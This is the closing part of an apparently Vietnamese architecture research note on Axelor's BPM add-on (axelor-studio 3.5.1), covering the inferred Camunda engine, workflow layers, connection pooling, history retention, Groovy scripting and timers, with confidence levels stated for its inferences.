- Giao dịch bù trừ (hoàn tác khi quy trình thất bại)?
- Sự kiện biên lỗi (bắt ngoại lệ trong nhiệm vụ dịch vụ)?

**5. Mô hình bảo mật:**
- Giao nhiệm vụ cho Nhóm/Vai trò Axelor (tích hợp với hệ thống quyền)?
- Quyền cấp quy trình (ai có thể khởi chạy quy trình nào)?
- Mã hóa biến (bảo vệ dữ liệu nhạy cảm trong biến quy trình)?
- Tích hợp nhật ký kiểm tra (ghi hành động quy trình vào hệ thống kiểm tra Axelor)?

**6. Quy trình phát triển:**
- Quản lý phiên bản tệp BPMN (xuất ra Git, tích hợp CI/CD)?
- Đẩy lên môi trường (phát triển → kiểm thử → sản xuất)?
- Chiến lược hoàn tác (quay về phiên bản quy trình trước)?
- Triển khai nóng (cập nhật phiên bản đang chạy sang phiên bản mới)?

**7. Giám sát và vận hành:**
- Chỉ số hiệu năng quy trình (thời lượng trung bình, xác định nút thắt)?
- Cấu hình cảnh báo (thông báo khi quy trình thất bại, vượt SLA)?
- Tùy chỉnh bảng điều khiển (KPI đặc thù nghiệp vụ)?
- Báo cáo lịch sử (xu hướng thực thi quy trình theo thời gian)?

**8. Tính năng nâng cao:**
- Bảng quyết định DMN có thực sự được sử dụng không? (kịch bản tự động hóa quyết định)
- Hỗ trợ quản lý tình huống CMMN? (quy trình tùy biến không có luồng định trước)
- Khuyến nghị tối ưu quy trình? (Studio phân tích quy trình, đề xuất cải tiến)
- Chế độ mô phỏng? (kiểm thử quy trình với dữ liệu mẫu trước khi triển khai)

**9. Khả năng mở rộng:**
- Mở rộng ngang (nhiều máy chủ ứng dụng thực thi quy trình)?
- Phân mảnh cơ sở dữ liệu cho bảng BPM (xử lý hàng triệu phiên bản)?
- Phân cụm bộ thực thi công việc bất đồng bộ (phân phối công việc hẹn giờ/bất đồng bộ)?
- Bản sao đọc cho truy vấn lịch sử (giảm tải lưu lượng giám sát)?

**10. Di chuyển và nâng cấp:**
- Đường dẫn nâng cấp khi phiên bản Studio mới khả dụng?
- Di chuyển phiên bản quy trình đang chạy sang định nghĩa mới?
- Di chuyển dữ liệu cho thay đổi lược đồ bảng BPM?
- Yêu cầu kiểm thử tương thích?

Trả lời các câu hỏi này rất quan trọng để lập kế hoạch triển khai sản xuất, định cỡ dung lượng, thiết kế khôi phục thảm họa, và chương trình đào tạo đội ngũ.

---

## TÓM TẮT KIẾN TRÚC BPM VÀ LUỒNG CÔNG VIỆC

Sau quá trình phân tích chi tiết từ cấu hình, phụ thuộc và các mẫu kiến trúc, có thể tóm lược kiến trúc BPM của Axelor như sau:

### Kiến trúc tiện ích bên ngoài

Chức năng BPM **KHÔNG** nằm trong kho mã lõi axelor-open-suite — được phân phối dưới dạng **tiện ích axelor-studio phiên bản 3.5.1**, phụ thuộc nhị phân phân giải qua Gradle. Quyết định kiến trúc phản ánh tính mô-đun: tổ chức không cần BPM có thể bỏ qua tiện ích (triển khai gọn hơn), Studio phát triển độc lập với bộ khung lõi (chu kỳ phát hành riêng). Đánh đổi: thiếu minh bạch triển khai (không thể kiểm tra mã nguồn), phụ thuộc nhà cung cấp (tiện ích độc quyền hoặc cấp phép riêng), hạn chế gỡ lỗi (không gỡ lỗi cấp mã nguồn).

### Động cơ suy luận: Camunda BPM (~75% độ tin cậy)

Phân tích mẫu cấu hình chỉ mạnh mẽ về phía **Camunda BPM** là động cơ nền tảng:
- Tên nhóm kết nối khớp chính xác quy ước Camunda
- Thời lượng ISO 8601 cho TTL lịch sử (`P180D`) là tính năng đặc thù Camunda
- Điều khiển nhật ký kép (nội bộ động cơ và cấp ứng dụng) phản ánh kiến trúc Camunda
- Mức phổ biến trong ngành (Camunda thống trị nền tảng BPM Java 2015–2023)

Các khả năng khác: Activiti 7+ (~15%), Flowable (~10%), động cơ tùy chỉnh (<1%). Không thể xác nhận phiên bản (có thể dòng 7.x) hay ấn bản (Cộng đồng hay Doanh nghiệp).

### Chiến lược luồng công việc kép

Axelor triển khai **hai cách tiếp cận luồng công việc bổ trợ** cùng tồn tại trong ứng dụng:

**Luồng công việc tầng dịch vụ** (mã Java):
- Logic nghiệp vụ cố định trong lớp dịch vụ
- Mẫu phương thức mẫu: `beforeCancel()`, `afterCancel()`
- Quan trọng về hiệu năng (thực thi cỡ micro giây)
- Quy trình ổn định hiếm khi thay đổi
- Nhà phát triển sở hữu, quản lý phiên bản trong Git

**Luồng công việc quy trình BPM** (BPMN):
- Định nghĩa quy trình trực quan trong Studio
- Cấu hình được tại thời điểm chạy bởi người dùng nghiệp vụ
- Nhiệm vụ con người, chuỗi phê duyệt, định tuyến phức tạp
- Nhật ký kiểm tra, lịch sử quy trình
- Người dùng nghiệp vụ sở hữu, cấu hình qua giao diện

Tích hợp: quy trình BPM gọi luồng công việc dịch vụ cho thao tác nguyên tử (duy trì nhất quán dữ liệu), luồng công việc dịch vụ không thể điều phối quy trình chạy dài (không hỗ trợ bộ hẹn giờ, không có nhiệm vụ người dùng). Tốt nhất cả hai: BPM cung cấp điều phối/phối hợp, dịch vụ cung cấp thao tác giao dịch.

### Nhóm kết nối chuyên dụng

Động cơ BPM duy trì **nhóm kết nối riêng biệt** (10-50 kết nối) cô lập khỏi nhóm ứng dụng (5-20 kết nối). Tách biệt rất quan trọng:
- Ngăn cạn kiệt tài nguyên (quy trình BPM mất kiểm soát không thể đóng băng ứng dụng)
- Đặc điểm tải khác nhau (BPM liên kết phức tạp so với ứng dụng CRUD đơn giản)
- Giám sát độc lập (theo dõi áp lực cơ sở dữ liệu BPM và ứng dụng riêng biệt)

Kích thước nhóm: 50 kết nối hỗ trợ khoảng 15-25 phiên bản quy trình đồng thời. Đồng thời cao hơn cần tinh chỉnh nhóm.

### Quản lý lịch sử: Lưu giữ 180 ngày

Cấu hình `studio.bpm.history.time.to.live = P180D` tự động xóa lịch sử quy trình cũ hơn 180 ngày. Ngăn tăng trưởng cơ sở dữ liệu không giới hạn — tổ chức chạy 100 quy trình/ngày tích lũy ~450 nghìn bản ghi lịch sử trong kỳ lưu giữ. Không có TTL, tích lũy nhiều năm đạt hàng gigabyte, hiệu năng truy vấn suy giảm. Kỳ lưu giữ cấu hình được theo yêu cầu tuân thủ (tài chính: 7 năm, linh hoạt: 30 ngày).

### Tích hợp kịch bản Groovy

Nhiệm vụ kịch bản thực thi mã Groovy 3.0.23 với ngữ cảnh được chuẩn bị đặc biệt:
- Biến BPM chuẩn: `execution`, `variables`, `processInstanceId`
- Ngữ cảnh Axelor (suy luận): `__ctx__`, `__user__`, `__repo__`, `__beans__`
- Mẫu truy cập kho dữ liệu: `__repo__(SaleOrder).find(id)`
- Gọi dịch vụ: `__beans__.get(ServiceClass).method()`

Mối lo bảo mật: thực thi kịch bản không hạn chế nguy hiểm (xóa dữ liệu, leo thang đặc quyền). Hệ thống sản xuất có thể triển khai hộp cát (hạn chế bộ nạp lớp, chặn phương thức, giới hạn thời gian thực thi).

### Trình xây dựng không mã của Studio

Studio có thể cung cấp công cụ thiết kế trực quan (suy luận từ mẫu ngành):
- **Trình mô hình quy trình**: Trình soạn trực quan BPMN, kéo thả nhiệm vụ/cổng
- **Trình xây dựng truy vấn**: Tạo bộ lọc trực quan cho truy vấn dữ liệu
- **Trình xây dựng ánh xạ**: Ánh xạ biến quy trình ↔ trường thực thể
- **Trình thiết kế biểu mẫu**: Bố cục và xác thực biểu mẫu nhiệm vụ người dùng
- **Trình xây dựng điều kiện**: Trình soạn biểu thức điều kiện có tự động hoàn thiện

Cách tiếp cận không mã cho phép nhà phân tích nghiệp vụ cấu hình quy trình mà không phải chờ hàng đợi nhà phát triển — giao hàng nhanh hơn, tinh chỉnh lặp lại, quyền sở hữu nghiệp vụ.

### Sự kiện hẹn giờ và tích hợp Quartz

Sự kiện hẹn giờ BPMN (bắt đầu, trung gian, biên) có thể tích hợp với bộ lập lịch Quartz (3 luồng làm việc từ cấu hình). Các loại bộ hẹn giờ:
- **Sự kiện bắt đầu**: Khởi chạy quy trình theo lịch (cron: hàng ngày lúc 2 giờ sáng)
- **Sự kiện trung gian**: Trì hoãn quy trình (chờ 3 ngày)
- **Sự kiện biên**: Quá hạn nhiệm vụ (leo thang nếu chưa phê duyệt trong 24 giờ)

Bộ hẹn giờ lưu bền trong cơ sở dữ liệu, sống sót qua khởi động lại. Triển khai theo cụm phối hợp qua khóa cơ sở dữ liệu đảm bảo thực thi đúng một lần.

### Tầng quản lý ứng dụng

Studio cung cấp **Quản lý ứng dụng** — hệ thống cài đặt/cấu hình theo mô-đun:
- Thực thể `App` cơ sở, mô-đun nghiệp vụ mở rộng (AppRecruitment, AppSale)
- Cấu hình: `studio.apps.install = all` (cài tất cả) hoặc danh sách chọn lọc
- `AppService` cung cấp truy cập toàn cục: `isAppInstalled()`, `getAppConfig()`
- Vòng đời: Khả dụng → Đang cài → Đã cài → Hoạt động → Tạm ngưng → Đã gỡ
- Phân giải phụ thuộc: cài ứng dụng phụ thuộc tự động cài các phụ thuộc

### Hạn chế do thiếu minh bạch triển khai

Kiến trúc tiện ích bên ngoài tạo ra hạn chế phân tích đáng kể:
- ❌ Không thể kiểm tra mã nguồn động cơ BPM (khởi tạo, nội bộ thực thi)
- ❌ Không có tệp BPMN mẫu (không thể học qua ví dụ)
- ❌ Không thấy dịch vụ triển khai quy trình
- ❌ Không có di chuyển lược đồ BPM (cấu trúc bảng chưa rõ)
- ❌ Không có kiểm thử đơn vị quy trình (cách tiếp cận kiểm thử chưa rõ)
- ❌ Không có mã bảng điều khiển giám sát (tính năng hiển thị chưa rõ)

Hầu hết câu hỏi vận hành BPM (hiệu năng, mở rộng, xử lý lỗi, bảo mật) chỉ trả lời được qua kiểm thử thực hành hoặc tài liệu nhà cung cấp.

---

**Tổng số sản phẩm đã phân tích:**
- Cấu hình: axelor-config.properties (phần BPM, cấu hình Quartz)
- Phụ thuộc: libs.gradle (axelor-studio:3.5.1)
- Tham chiếu thực thể: AppRecruitment.xml, AppProject.xml
- Mẫu dịch vụ: WorkflowCancelServiceSupplychainImpl.java

**Mức độ tin cậy:**
- ✅ Tin cậy cao (80-100%): Kiến trúc tiện ích bên ngoài, nhóm kết nối chuyên dụng, TTL lịch sử, tích hợp Groovy
- ⚠️ Tin cậy trung bình (50-80%): Xác định động cơ Camunda, chức năng trình xây dựng không mã
- ❓ Tin cậy thấp (<50%): Phiên bản động cơ cụ thể, hỗ trợ DMN, khả năng giám sát, bề mặt API chính xác

**Nguồn:** Phân tích cấu hình, kiểm tra phụ thuộc, mẫu quan hệ thực thể, ví dụ mã dịch vụ, suy luận kiến trúc dựa trên thực tiễn BPM chuẩn trong ngành và các mẫu thiết kế đã chứng minh của Axelor.

---

*Kết thúc RESEARCH_STEP4_BPM.md*
